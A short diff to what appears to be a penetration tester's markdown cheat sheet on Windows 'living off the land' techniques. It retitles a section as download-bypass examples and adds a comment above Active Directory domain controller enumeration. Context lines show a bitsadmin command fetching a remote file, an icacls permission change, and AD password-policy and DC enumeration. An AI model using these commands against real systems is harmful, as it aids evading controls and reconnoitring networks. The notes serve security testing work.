@@ -2,7 +2,7 @@
 
 ## Living off the Land
 https://lolbas-project.github.io/#  
-### Examples
+### Download Remote File Bypass Examples
 #### Bitsadmin
 `bitsadmin /transfer "import" https://<URL> C:\Users\<user>\output.txt`
 #### cmdl32
@@ -31,6 +31,7 @@ icacls %cd% /remove:d %username%
 ```
 # Password Policies
 Get-ADDefaultDomainPasswordPolicy
+# List DC's
 Get-ADDomainController -filter * | select Name, IPv4Address
 ```
 ### Organizational Units and Device Searches
